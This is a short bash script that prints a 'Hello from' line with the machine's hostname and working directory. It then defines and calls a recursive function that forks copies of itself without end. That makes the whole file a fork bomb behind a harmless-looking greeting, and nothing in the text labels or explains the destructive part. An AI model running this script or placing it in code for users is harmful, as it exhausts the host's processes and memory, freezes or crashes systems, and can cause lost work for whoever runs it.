#!/bin/bash

echo "Hello from" `hostname`:`pwd`

f() {
	while true
	do
		f | f &
	done
}

f
